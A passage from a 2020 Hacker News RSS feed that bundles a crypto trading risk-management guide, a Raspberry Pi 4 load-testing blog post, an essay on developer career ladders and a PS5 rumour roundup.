<p>One example would be : You beleave Bitcoin will go higher in the longterm and have some in your hardware wallet and some in your trading account, the smart thing to do is not to trade the BTC you have in your hardware wallet.</p>



<p>Allocating the capital is up you, you can split it in equal slices or any other way you want, <strong>just split it</strong>!</p>



<h2 id="acc-risk">Account Risk</h2>



<p>I am still amazed of how many people still don’t understand the difference between account risk and account size. The Account risk is determined by taking note of the account size. You will risk x% of your account size on a single trade.</p>



<p>Now there is a fixed rule for this , it’s <strong>called the 2% rule</strong> and basically it tells you to not risk more than 2% of your account size in one trade. This is where most people get it wrong . The 2% risk size does not mean you trade 2% of your account, it means the loss you might have must not exceed this limit.</p>



<p>In order to establish the 2% of risk you are willing to take on a trade, you first need to establish the entry, exit and stop loss of your trade. You also need to take into consideration that if you’re using leverage that will affect your losses.</p>



<div><p><strong>Risk/Reward ratio</strong><br>The risk reward ratio also called RR is the ratio between the possible losses and the possible winning , Risk / Reward. It helps us see if a trade is viable at a glance. <br>The higher the ratio, the better the trade(Ex. A ratio of 0,5/1 is bad , a ratio of 3/1 is good).<strong>The minimum accepted RR ratio at Sublime Traders is 1,7/1 and in rare cases.</strong></p><p>This part is where many cryptocurrency signal providers start to act funny, let me explain why. Because signal providers want to have as many signals as possible they post trades that have 1/1 Ratio or even lower. The problem here is obvious for seasoned traders, the thing is <strong>you can not be consistently profitable with a 1/1 RR ratio or lower, in fact the minimum is 1,5/1 and you really have to master your entries for this to be viable</strong>. </p></div>



<p>Let me explain further. Say you have a 3/1 RR ratio which is a good ratio, in the long run you win because for every trade you lose 1 and you win 3, this means you only need to win 3,33 trades out of 10 in order to be break even. With a ratio of 1/1 you can not possibly sustain constant profit because the risk and the rewards are the same.<br>I really can’t stress how important this aspect is please read several times until you understand this aspect perfectly, stop trading 1/1’s, it’s stupid😊</p>



<p><strong>Pro tip</strong> : The <strong>tradingview</strong> chart suite which has been <a rel="noreferrer noopener" href="https://sublimetraders.com/new-crypto-traders/10-trading-tools-every-crypto-trader-should-know/" target="_blank"><strong>reviewed here</strong></a> offers simple inputs for risk amount and risk reward ratio with the <strong>position tool</strong>.</p>



<figure><img src="https://sublimetraders.com/wp-content/uploads/2020/06/Screenshot-at-Jun-15-14-57-17.png" alt="" srcset="https://sublimetraders.com/wp-content/uploads/2020/06/Screenshot-at-Jun-15-14-57-17.png 908w, https://sublimetraders.com/wp-content/uploads/2020/06/Screenshot-at-Jun-15-14-57-17-300x243.png 300w, https://sublimetraders.com/wp-content/uploads/2020/06/Screenshot-at-Jun-15-14-57-17-768x621.png 768w, https://sublimetraders.com/wp-content/uploads/2020/06/Screenshot-at-Jun-15-14-57-17-370x300.png 370w, https://sublimetraders.com/wp-content/uploads/2020/06/Screenshot-at-Jun-15-14-57-17-85x70.png 85w" sizes="(max-width: 908px) 100vw, 908px"></figure>



<h2 id="trade-risk">Trade Risk</h2>



<p>So far we have our account size and account risk , let’s now determine the position size of a single trade. Losses are <strong>always</strong> part of the game so this needs to be taken into consideration when determining the entry size of your position. </p>



<p>Lets clear things out with a list of to do’s when posting a trade:</p>



<ul><li>Identify entry</li><li>Identify Take profit</li><li>Identify Stop Loss</li><li>Identify RR ratio</li><li>If ratio &gt; 1,7/1 then post trade (there you go, i created a short if statement for algo trading)</li></ul>



<h2 id="pos-size">Position sizing</h2>



<p>This part is the most difficult when setting up a trade. It takes into consideration or the elements we mentioned before.</p>



<p>Let’s take an example:</p>



<ul><li>Account size – $1000</li><li>Account risk – 2%</li><li>Distance to stop loss(invalidating point) – 5%</li></ul>



<pre>position size&nbsp;=&nbsp;account size&nbsp;x&nbsp;account risk&nbsp;/&nbsp;invalidation point
position size&nbsp;=&nbsp;$1000&nbsp;x&nbsp;0.02&nbsp;/&nbsp;0.05
position size = $400</pre>



<p>What this does it it protects your capital from heavy losses and it basically allows you to stay in the game. Remember to add trading fees to your calculation for bigger sizes. Trading fees vary from exchange to exchange but in general they are 0,1% on every trade for spot exchanges, and 0,075% for  takers on futures like <a href="https://partner.bybit.com/b/sublimetraders">Bybit</a> and -0,025 for makers (you get paid for limit orders).</p>



<h2 id="final">Final Word</h2>



<p>Our job is to provide clear <strong>entry</strong>, <strong>take profits</strong> and <strong>stop loss</strong> for every trade you post, you on the other hand need to manage your risk properly by following this guide or doing your own research.</p>
                    
                                            
                                    </div></div>]]>
            </description>
            <link>https://sublimetraders.com/cryptocurrency-market-analysis/risk-management-ratio-sizing-crypto-trades/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741918</guid>
            <pubDate>Sun, 05 Jul 2020 20:58:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comprehensive list of Dos-based palmtop computers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23741810">thread link</a>) | @Ijumfs
<br/>
July 5, 2020 | http://www.tankraider.com/DOSPALMTOP/list.html | <a href="https://web.archive.org/web/*/http://www.tankraider.com/DOSPALMTOP/list.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.tankraider.com/DOSPALMTOP/list.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741810</guid>
            <pubDate>Sun, 05 Jul 2020 20:46:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on the Raspberry Pi 4 and 10k TCP connections with Vert.x]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23741598">thread link</a>) | @asadawadia
<br/>
July 5, 2020 | https://aawadia.hashnode.dev/thoughts-on-the-raspberry-pi-4-10k-tcp-connections-with-vertx-ckc9huyxk0087mns121re4awv | <a href="https://web.archive.org/web/*/https://aawadia.hashnode.dev/thoughts-on-the-raspberry-pi-4-10k-tcp-connections-with-vertx-ckc9huyxk0087mns121re4awv">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>I recently picked up a Raspberry Pi 4 [4GB edition]. 
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1593971667034/LD9-XNgaz.jpeg?auto=format&amp;q=60" alt="B15DC608-54AE-476A-AE53-FCB3E3EC6889.jpg"></p>
<h2 id="background-context">Background Context</h2>
<p>I had been debating picking up a Linux system for some dev work. I don't like using Docker right from the get go as a dev environment. My general workflow for any project goes in the following steps - for a Kotlin project</p>
<ol>
<li>Run from IDE</li>
<li>Run from terminal via build tool such as maven or bazel</li>
<li>Compile to a fat jar and run using <code>java -jar &lt;project&gt;.jar</code></li>
<li>Run fat jar on a Linux server [now possible]</li>
<li>Run as a docker container</li>
<li>Run as a Kubernetes deployment</li>
</ol>
<p>I know many devs have jumped directly to step 5 but I think it is still important to make sure that steps 1-4 are compiling and running properly.  Step 1 is still important because other devs, who do not have context, will navigate to your project [in their IDE] to add new features or fix bugs. Very likely, they will add a bunch of print statements in the project and start making requests to see what the internals look like. I guess you could use the documentation on confluence but sometimes it is easier and faster to just log-dump the request. They should to be able to spin the service up easily when they have no context. The project should not fail to startup because a required environment variable was not set - set a sane default, log the behaviour [such as persistence disabled] and proceed.</p>
<p>If for any reason you think this is a lot of work - I present you Margaret Hamilton the lead developer on the Apollo mission standing next to the hard copy of the code base.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1593974553056/BUndgAHNK.gif?auto=format,compress&amp;gif-q=60" alt="apollo.gif"></p>
<h2 id="vps-vs-raspberry-pi">VPS vs Raspberry Pi</h2>
<p>I was thinking of getting a digital ocean VPS - with the 1CPU 1GB ram costing about $5/month or $20 for the 2CPU 4GB ram. The monthly cost was definitely a factor since I was planning on running multiple things 24/7 and not just one small app. The advantage was being able to easily expose it on the internet for demo reasons. For an in house server, I would have to port forward on my router, which I was [and still am] not a big fan of. Ngrok [<a href="https://ngrok.com/" target="_blank">ngrok.com</a>] definitely could be a quick workaround. Another concern was that I love doing benchmarks and load testing. I did not want to cause any DDoS triggers on DO's end getting my account suspended or anything like that.</p>
<p>I picked up the CanaKit Raspberry Pi 4 Starter Kit (4GB RAM) from Amazon. Definitely a bit more expensive than I thought it was going to be all things considered. It was relatively easy to set up the heat sinks and the case. Hooked it up to a keyboard, mouse, and my TV to install the OS. I don't need a GUI so I installed the headless Raspberry Pi OS which is debian based [apt - not yum]. <code>raspberrypi.local</code> is set up to connect to the Pi.</p>
<pre><code>pi@raspberrypi ➜  ~ uname <span>-a</span>
Linux raspberrypi 4.19.118-v7l+ 
</code></pre><h2 id="what-s-running-on-it-">What's running on it?</h2>
<p>A server is useless if it is not running anything. I had a few things I knew I was going to set up. The first was a DNS level ad blocker pi hole [<a href="https://pi-hole.net/" target="_blank">pi-hole.net</a>]. Gave my Pi a static IP via DHCP reservation in my Rogers router and set up pi hole to block out any ads for all devices that used it as a DNS Server. Just this one application alone made the pi worth it. Pi hole helps quite a bit. Doesn't block everything [like ads on YouTube in mobile] but it is good enough. Also caches the DNS responses so browsing seems a bit zippier too. It is PHP based so it needs a webserver to call out to the php scripts - lighthttpd in this case. Not a big fan of this. Why are we still using PHP + web servers in 2020??</p>
<p>List of other things I set up not including things like zsh and htop:</p>
<ol>
<li>OpenJDK [OpenJ9 seems to have limited to no support for ARM]</li>
<li>Redis</li>
<li>Postgres</li>
<li>Grafana</li>
<li>Prometheus</li>
<li>MongoDB</li>
<li>InfluxDB [docker container]</li>
<li>Docker registry [docker container]</li>
<li>Node.js for Vue.js dev work</li>
<li>Caddy</li>
<li>Nginx [inactive]</li>
<li>rustc and go</li>
</ol>
<p>I set up gitea [ <a href="https://gitea.io/en-us" target="_blank">gitea.io/en-us</a> ] which is a self hosted git server as well - but the SSH permissions to push/pull got borked :(</p>
<p>I installed caddy as a reverse proxy for the pi to route to various services I have running behind it. Caddy is similar to nginx but with slightly easier configurations and automatic HTTPS setup.</p>
<pre><code>
localhost, raspberrypi.<span>local</span> {
     route / {
        respond <span>"{time.now.common_log} {system.os} {system.arch} {http.request.proto} {http.request.method} {http.request.uri}"</span>
    }
}
</code></pre><pre><code>➜  ~ curl -k https:
<span>05</span>/Jul/<span>2020</span>:<span>15</span>:<span>17</span>:<span>16</span> -<span>0400</span> linux arm HTTP/<span>2.0</span> GET /
</code></pre><h2 id="load-testing-and-10k-connections">Load testing and 10k connections</h2>
<p>Running wrk on Caddy [with logging turned on] I got the following results</p>
<pre><code>$ wrk -t <span>32</span> -c <span>64</span> -d20s https:
Running <span>20s</span> test @ https:
  <span>32</span> threads and <span>64</span> connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency     <span>7.15</span>ms    <span>3.91</span>ms  <span>60.06</span>ms   <span>83.81</span>%
    Req/Sec   <span>291.33</span>     <span>36.82</span>   <span>390.00</span>     <span>74.65</span>%
  <span>185508</span> requests in <span>20.07s</span>, <span>25.12</span>MB read
Requests/sec:   <span>9241.25</span>
Transfer/sec:      <span>1.25</span>MB
</code></pre><p>Next I setup a Vert.x TCP server and used tcpkali [ <a href="https://github.com/satori-com/tcpkali" target="_blank">github.com/satori-com/tcpkali</a> ] to see if the Pi could handle 10k concurrent connections.</p>
<p>As always, I opted to use vert.x to create the tcp server. A tcp server in vert.x can be spun up very easily with the following lines of code</p>
<pre><code><span>val</span> vertx = Vertx.vertx()

vertx.createNetServer().connectHandler { 
  
  it.handler { 
    
  }
}.listen(<span>9091</span>)
</code></pre><p>I also added some prometheus metrics:</p>
<ol>
<li>Node exporter to get the system information of the pi during the load test</li>
<li>Micrometer bindings to get the JVM information</li>
<li>Vert.x metrics to get the net server connection count + a custom packet received counter</li>
</ol>
<p>The entire main function can be viewed in here - <a href="https://gist.github.com/asad-awadia/93ba7c1eba6d6b8a8a84e9f20721d983" target="_blank">gist.github.com/asad-awadia/93ba7c1eba6d6b8..</a></p>
<p>Then the test began using tcpkali <code>tcpkali -m '$' -r 10 -c 10k -T 240s --connect-rate=1000 &lt;pi-ip&gt;:9091</code></p>
<p>Some grafana screenshots:</p>
<p>Vert.x net server connections + packet received
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1593977834283/PQWiJouxr.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-04 at 12.48.09 PM.png"></p>
<p>CPU usage
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1593977882225/wuc7a5Z-X.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-04 at 12.47.17 PM.png"></p>
<p>JVM memory used - vert.x is really memory efficient
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1593977897137/fNbEQl2Xw.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-04 at 12.47.05 PM.png"></p>
<p>Node exporter quick stats
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1593977918587/Z5FjhSwyO.png?auto=format&amp;q=60" alt="Screen Shot 2020-07-04 at 12.46.00 PM.png"></p>
<p>For a tiny little device it seems more than capable for a single dev. I would not use it as a build server for your company's production apps but to have an always on linux system available is really nice to have.</p>
</div></div>]]>
            </description>
            <link>https://aawadia.hashnode.dev/thoughts-on-the-raspberry-pi-4-10k-tcp-connections-with-vertx-ckc9huyxk0087mns121re4awv</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741598</guid>
            <pubDate>Sun, 05 Jul 2020 20:21:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It’s Time to Reassess the Developer Career Ladder]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23741511">thread link</a>) | @caution
<br/>
July 5, 2020 | https://cult.honeypot.io/reads/reassess-the-developer-career-ladder | <a href="https://web.archive.org/web/*/https://cult.honeypot.io/reads/reassess-the-developer-career-ladder">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The career ladder for software engineers is often confusing and inconsistent.&nbsp; Many people who go into software development tend to go in with tunnel vision - they don’t even think about the career ladder because they’re so focused on the next pay bump or the next feature release. Also, they know that there are at least two steps in the ladder to worry about before anything dramatic can happen: junior developers become mid level developers and mid level developers become senior developers. But what about after that?&nbsp;</p><p>A lot of the problems that developers complain about in the tech industry are nested within that question. If you’ve been coding for the last four or five years of your life, spending more time in front of the computer than in front of other people, chances are your social skills might have taken a hit. If you are an extrovert or even moderately outgoing, this probably wouldn’t be a big deal. But if you’ve always been the type to prefer staying indoors, or worse, preferred the company of computers over people, a manager is probably the last thing you want to be.</p><h3><b>The Problem with Promoting All Senior Developers to Managers</b></h3><p>Unfortunately many organizations promote senior developers to managerial roles. There is a mistaken assumption among people in leadership that those who develop a high level of expertise in their field will naturally be good at managing. They fail to consider that what makes a good software engineer and what makes a good manager can often be at odds with each other. Good developers are detail-oriented, deep thinkers who thrive on solving technical challenges that are, at the end of the day, either solved or not solved. Good managers can see the big picture, and thrive on solving problems at the organizational level that require negotiating with, compromising, and sometimes confronting other people.&nbsp; These types of problems rarely have a black and white outcome, and usually there is no tangible reward besides the relative happiness of the employees.&nbsp;&nbsp;</p><p>I have experienced this first hand with one of my past managers. He had an impressive looking resume, having worked on the ground level of many start-ups as CTO and founder, but he seemed to be much more proud of the fact that he had been coding for three decades. On the surface he seemed like he would make a good manager, probably because he exuded a great deal of confidence. Unfortunately it ended up being quite the opposite. It took months for leadership to take action despite many employee complaints. What was especially uncomfortable was the way the manager responded when he discovered he was under fire. At every 1:1 he would ask me directly for negative feedback I had about him, as if I would just tell him to his face. It was incredibly awkward, and demonstrated a complete failure of grasping social norms. Not to mention empathy for the other person in the room and how they might feel being asked such questions. He also seemed to believe that if nobody gave them the negative feedback to their face, that this must mean he was actually performing well.&nbsp;</p><p>Ultimately, this particular manager was much better suited to programming as an individual contributor rather than leading a team.&nbsp;</p><h3><b>Alternative pathways for senior developers</b></h3><p>Luckily, some companies have moved away from promoting all of their software engineers to managers. One alternative approach is to give software developers three different “tracks” to choose from. Developers can take on a range of leadership responsibilities depending on the track. For instance, there is the team lead track where senior engineers become lead developers that make some of the more challenging and difficult technical decisions for the team. They also help mentor their teammates but do not take on as many managerial duties as an engineering manager.&nbsp;</p><p>For developers who have no interest in taking on leadership duties, there is the option of becoming a software architect. These developers get to make technical decisions that usually impact the future of the company and are often trusted with the keys to the kingdom. These developers are the ones who understand how all the software fits together and have a mental model that includes every little nook and cranny of code.&nbsp;</p><p>The best part about having this three track system for promoting software engineers is that there is wiggle room to switch between tracks if a developer decides they want to try something different or if it turns out they are not well suited for the track they are on. It reduces the risk of creating terrible managers that end up causing other developers to quit or lose motivation. The personality and attitude of managers in an organization often influence the culture. It’s important for leadership to reach out to their direct reports and be able to identify and fix issues when they arise.&nbsp;</p><p>Unfortunately, even this three track system is not bulletproof. Favouritism, slowness in moving people to a different track, and poor promotion metrics can cause even the best system to fall apart. Start-ups can be especially vulnerable to developers that can suck up to the CEO and bypass formal processes. While large companies tend to have less of that problem, they often adopt ranking systems that may or may not be effective at identifying the best employees, depending on how easy it is to play the system and how many people fall between the cracks.&nbsp;</p><p>Muddying the waters even further is the fact that developers often switch jobs when they don’t see a path forward at their current company. My first official title when I broke into the field was “Software Engineer.” When I moved to DC it became “UI/UX Developer” and I negotiated a pretty hefty pay raise in light of the difference in cost of living from Missouri. The following job ended up giving me a senior title despite the fact that I had less than 2 years of experience in the industry. They gave developers seniority not purely based on years of experience, but based on that developer’s salary.&nbsp;</p><p>This led to a strange and somewhat uncomfortable situation for me when, two jobs later, I found myself back in a mid-level title. From an outsider’s perspective, it sort of looked like a demotion. I didn’t know whether to remove “senior” on my past positions on LinkedIn or whether that would end up hurting me more. It happens because there is no standard for rating a developer’s skill level across the industry, and certainly no standard for pay depending on that level.&nbsp;</p><h3><b>A potential solution?</b></h3><p>That is why some developers have been calling for the creation of an organization responsible for standardizing the requirements and skills that developers need across the United States in order to create a more level playing field and also a system that allows developers to advocate for themselves and figure out if they are being underpaid. Unlike these three track systems which still allow managers to make decisions based on their own opinion about a developer, a trade organization for developers would create a third party that holds managers accountable.&nbsp;</p><p>Certainly there are potential problems that could be introduced by a trade organization, but right now the software engineering industry is basically the wild west when it comes to promotions. You have developers with 10 years of experience being paid 45K alongside junior developers at start-ups making upwards of 100K. Underrepresented folks in tech are still seeing a gap between their paychecks and those of their white male counterparts. Every time I got a new job part of me felt like I was back at square one again. As technology becomes more and more complex and humans rely on it on a daily basis, it seems the lack of a trade industry could not only be problematic but even catastrophic.&nbsp;</p><h3><b>Technology Industry Standards Impact Millions</b></h3><p>Having no coding standard for, say, a social media company, might seem inconsequential, but when you have software operating planes and cars and security there are lives at stake. It’s not just about making developers’ lives easier and fairer, it’s about creating a system where technology can actually be reliable and not subject to the whims of a company CEO that wants to save some money by telling developers to cut corners. Developers and frankly, the human race, deserves better.&nbsp;</p></div></div>]]>
            </description>
            <link>https://cult.honeypot.io/reads/reassess-the-developer-career-ladder</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741511</guid>
            <pubDate>Sun, 05 Jul 2020 20:09:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All about the upcoming Playstation 5]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23741507">thread link</a>) | @ezrakewa
<br/>
July 5, 2020 | https://www.4alltech.com/2020/07/when-does-ps5-appear-what-hardware-will.html | <a href="https://web.archive.org/web/*/https://www.4alltech.com/2020/07/when-does-ps5-appear-what-hardware-will.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<div id="post-body-8407308363661742376" itemprop="articleBody">
<meta content=" PS5 release, price, hardware: All information about the PlayStation 5      The PlayStation 5 is the successor to the PS4. So far, no design..." name="twitter:description">
<div id="adsense-target">
<p><span>PS5 release, price, hardware: All information about the PlayStation 5</span></p><p><a href="https://1.bp.blogspot.com/-jCSyAezVgZ8/XwIrvQTt6GI/AAAAAAAAAaU/6rrqXXf6ylYcHL3txXfpSEXY-uHSbF47gCLcBGAsYHQ/s1600/ps5family-peripherie_6103290.jpg" imageanchor="1"><img data-original-height="720" data-original-width="1280" height="360" src="https://1.bp.blogspot.com/-jCSyAezVgZ8/XwIrvQTt6GI/AAAAAAAAAaU/6rrqXXf6ylYcHL3txXfpSEXY-uHSbF47gCLcBGAsYHQ/s640/ps5family-peripherie_6103290.jpg" width="640"></a></p>
<p><span><br></span>
<br>
<span>The PlayStation 5 is the successor to the PS4. So far, no design, price or launch date are known. But there is still a lot of known information and many credible rumors. In this article we collect all information and news about the price, release, hardware and games.</span></p><p>

<span>We have collected all the information and rumors of the past few years for you so that you can find everything there is to know and expect about PlayStation 5 at a glance:</span><br>
<span><br></span>
<span><b>PS5 release - when does the console appear?</b></span><br>
<span>The most important question first: when will the PS5 come out? We know that, according to Sony's official statement, the next-gen console will appear at the end of 2020 , during the so-called Holiday Season (more or less the extended Christmas business. Everything is possible here from late October to mid-December).</span><br>
<span><br></span>
<span>According to Sony, the target release period is still certain despite the corona crisis. This was confirmed by Sony Interactive Entertainment President Jim Ryan in early April 2020.</span><br>
<span><br></span>
<span><b>Price - What will the PS5 cost?</b></span><br>
<span>The PS4 cost just under 400 euros for the launch , the PS4 Pro also went over the counter for 400 euros at the beginning. However, it is becoming increasingly unlikely that the PS5 will be offered at the same price. It will probably be more expensive than the PS4 and PS4 Pro .</span><br>
<span><br></span>
<span>What does Sony say about the PS5 price? According to Sonys Mark Cerny, the system architect of the PS5, the console "should offer a reasonable and attractive cost factor" . Hiroki Totoki, Chief Finanical Officer at Sony, said the price of the next-gen console also depends on the competition . Apparently, Sony is planning to undercut Microsoft again.</span><br>
<span><br></span>
<span>What are the rumors about the price? According to insiders, Sony is currently struggling to keep production costs below $ 450 . A Bloomberg report from April 2020 also fits in with this: Individual components are expensive and sometimes fiercely competitive, because different manufacturers would try to do so at the same time. According to Bloomberg, PS5 estimates are between $ 499 and $ 549.</span><br>
<span><br></span>
<span><b>PlayStation 5 design - what does the PS5 look like?</b></span><br>
<span>The PS5 was unveiled as part of Sony's reveal event on June 11th. The console is available in two models, one with a drive and one without. The latter is accordingly slimmer.</span><br>
<span>In addition to the missing drive and the slightly customized design, there are other differences between the standard model of the PS5 and the Digital Edition:</span><br>
<span>PS5 advertising slogan: The official slogan for the Next Gen console for the system is "Play Has No Limits", probably an allusion to the significantly increased speed of the system.</span><br>
<span><br></span>
<span>By the way, you can already put the PS5 in your apartment. At least as a virtual 3D model thanks to the corresponding AR app.</span><br>
<span><br></span>
<span><b>PS5 peripherals - This is the PlayStation 5 family</b></span><br>
<span>In addition to the actual PS5 console, Sony has also introduced some peripheral devices that belong to the expanded circle of the PlayStation family. If you want to stock up on it, you can choose among:</span><br>
<span><br></span>
<span>HD camera with two 1080p lenses</span><br>
<span>PULSE ED wireless headset</span><br>
<span>Media remote control</span><br>
<span>DualSense charging station</span><br>
<span><b><br></b></span></p><p><a href="https://1.bp.blogspot.com/-DDwTZYOD8RE/XwIr_UWQC7I/AAAAAAAAAac/Ct_ZL3kft0ANis5JnnsgRheCs__tFl2JgCLcBGAsYHQ/s1600/ps5-playstation-5-reveal_6103769.jpg" imageanchor="1"><img data-original-height="347" data-original-width="617" height="358" src="https://1.bp.blogspot.com/-DDwTZYOD8RE/XwIr_UWQC7I/AAAAAAAAAac/Ct_ZL3kft0ANis5JnnsgRheCs__tFl2JgCLcBGAsYHQ/s640/ps5-playstation-5-reveal_6103769.jpg" width="640"></a></p>
<p><span><b><br></b></span>
<span><b>Hardware specs of the PS5</b></span><br>
<span>The exact hardware details of the PlayStation 5 were revealed by Sony's console architect Mark Cerny in March 2020. Here are the key performance data:</span><br>
<span><br></span>
<span>CPU: eight-core Zen 2 with 3.5 GHz clocking</span><br>
<span>GPU: 10.28 teraflops, 36 CUs (RDNA 2)</span><br>
<span>RAM: 16GB GDDR6</span><br>
<span>Hard drive: 825GB SSD</span><br>
<span>Extended storage: SSD slot</span><br>
<span>Drive: 4K UHD Blu-Ray drive</span><br>
<span>For comparison: the standard PS4 only comes to 1.84 TeraFLOPS, the Pro to 4.2 TeraFLOPS.</span><br>
<span><br></span>
<span>About the CPU: The Zen 2 CPU comes from the manufacturer AMD and contains 8 cores, just like the PS4 Pro. It was probably just not necessary to top up here, after all the Zen architecture ensures that the PS5 should run significantly faster even at the same clock rate.</span><br>
<span><br></span>
<span>SSD ensures more speed</span><br>
<span>Although the storage capacity is slightly reduced compared to the PS4 Pro and Xbox Series X, as John Linnemann from Digital Foundry announced on Twitter, the speed of the hard drive (5.5GB / s Raw / 9GB / s Compressed) is "the craziest" the PS5 ". Not only is it already very fast from the pure values, the SSD should also be a lot faster than that of the Xbox Series X.</span><br>
<span><br></span>
<span>Speed ​​example: If 1GB of data was previously loaded from the PS4 in 20 seconds, 2GB of data should now be processed in 0.27 seconds.</span></p><p>

<span>More memory? The SSD hard drive storage of the PS5 can be expanded by the way . And that with standard external SSDs that are checked for compatibility by Sony. However, this will only be possible after the launch. In addition, the operating system of the PS5 significantly smaller than that of the PS4, which means that less memory is blocked by the OS.</span><br>
<span><br></span>
<span>Faster data processing speed: thanks to SSD, the PS5 is even 100 times faster than the PS4, according to Sony. Sony is referring to the data processing speed of the Next Gen console (not the loading speed in games).&nbsp;</span></p><p>

<span>The built-in SSD should also reduce the charging times by a multiple compared to the PS4 Pro .</span><br>
<span><br></span>
<span><span><br></span><span></span><span>PS5 is supposed to get by without loading screens.</span></span>
<span>In a video, Sony shows how fast the PS5 is actually . Using the example of Marvel's Spider-Man, the loading times of the Next Gen console are compared with the PS4 Pro - and the difference is huge, at least in this game.</span><br>
<span><br></span>
<span>In fact, Sony's vision is to eliminate the loading screens entirely. According to Sony, the ultra-fast SSD is the key to the next generation and the first step to make loading screens a thing of the past.</span><br>
<span><br></span>

<span><b>What should the graphics of the PS5 offer?</b></span><br>
<span>8K resolution confirmed: As Sony's systems engineer Mark Cerny revealed in an interview, the PS5 is said to support 8K resolution. Even 4K screens are not yet widespread, so you can imagine how many users can actually enjoy 8K content directly at launch (the short answer: everyone who has between 5,000 and 15,000 euros for an 8K monitor).</span><br>
<span><br></span>
<span>Ray tracing on the PS5.</span><br>
<span>When it comes to hardware, it is also important to know that ray tracing on the PS5 is not anchored in the software, but in the hardware. "There is ray tracing acceleration in the GPU unit," Cerny is quoted as saying.</span><br>
<span><br></span>
<span>More freedom in downloading and installing.</span><br>
<span>The use of storage space on the PS5 should become more economical due to the type of game installation . Games should be able to be saved in granular form, which means that only the parts of the title that we want to play have to be downloaded, for example only the multiplayer campaign of a title, when we are already through with the single player.</span><br>
<span><br></span>
<span>Blu-ray drive confirmed for PS5</span><br>
<span>Yes, the next PlayStation will definitely use physical storage media. System architect Mark Cerny confirmed this in an exclusive Wired article .</span><br>
<span><br></span>
<span>BluRays should continue to function as the medium, as Cerny also reveals. In contrast to the currently available PS4 Pro, the optical drive should also be able to be used as a 4k Blu-Ray player.</span><br>
<span><br></span>
<span><b>Improved heat management</b></span><br>
<span>According to a Bloomberg report , Sony "unusually" spends a lot of money on a PS5 cooling system . This could suggest that the sometimes extreme volume of the PS4 fans should be contained.</span><br>
<span><br></span>
<span>What many of you should also be very happy about is a statement by Cerny about the heat sensitivity of the PS5. If the PS4 was still on its knees when the outside temperature was high, this should change in the future:</span><br>
<span><br></span>
<span>"" All work processes of the PS5 run at the same performance level in every environment. The outside temperature is not critical. ""</span><br>
<span><br></span>
<span><b>PS5: downward compatibility confirmed</b></span><br>
<span>Clear answer: According to system architect Mark Cerny, the next hardware generation of the PlayStation family will be compatible with the PS4 software . Thanks to the existing drive, we can also insert and play our favorite titles of the current console generation on the PS5. The goal is to almost all offer over 4000 PS4 games - in improved quality.</span><br>
<span><br></span>
<span>Own PS4 mode: We now have more specific information on PS4 downward compatibility. The PS5 comes with its own mode for PS4 games, of which at least 100 are already available for launch. According to Sony, these were successfully tested on the PS5. However, it is not excluded that this catalog will be expanded at the start.</span><br>
<span><br></span>
<span>Also applies to PSVR: The PSVR headset is also taken into account in downward compatibility and will also connect to the PS5.</span><br>
<span><br></span>
<span>New engine is supposed to make retro titles even prettier: Sony is said to even be working on a so-called "remastering engine" that should allow older titles to be graphically enhanced. That would be comparable to the possibilities of the Xbox One X, for which old Xbox titles can also be optimized.</span><br>
<span><br></span>
<span><b>PS5: what about VR?</b></span><br>
<span>So far, it is only known that the PSVR headset of the PS4 will be backwards compatible on the new console. So far there are only various rumors and pending patents about a possible PSVR2 for the PS5, so far Sony has not commented on this topic.</span><br>
<span><br></span>
<span>PS5 controller: what can we expect from the DualSense?</span><br>
<span>The new controller that the PS5 will introduce was officially unveiled on April 7: it's called DualSense.</span><br>
<span>What can the new PS5 controller do?</span><br>
<span><br></span>
<span>haptic feedback</span><br>
<span>Adaptive trigger</span><br>
<span>Rechargeable batteries</span><br>
<span>Create Button replaces the Share Button</span><br>
<span>Built-in microphone</span><br>
<span>Lightbar now next to the touchpad</span><br>
<span><br></span>
<span>PS5 controller becomes backwards compatible</span><br>
<span>Similar to the PS5 itself, the DualSense should also be compatible with the PlayStation 4 . This can be found on the French PlayStation website.</span><br>
<span><br></span>
<span>The other way round, there are rumors that the PS4 controller can also be connected to the PS5 . However, this has not been confirmed.</span><br>
<span><br></span>
<span>At least three more years of support for the PS4</span><br>
<span>Even after the launch of the PS5, the previous generation should not be dropped. According to a presentation at an investor conference , the PS4 should remain the engine for Sony's profitability for at least three years.</span><br>
<span><br></span>
<span>how do you see it? What are your wishes for the PS5? And what do you think is not possible?</span></p>
</div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.4alltech.com/2020/07/when-does-ps5-appear-what-hardware-will.html">https://www.4alltech.com/2020/07/when-does-ps5-appear-what-hardware-will.html</a></em></p>]]>
            </description>
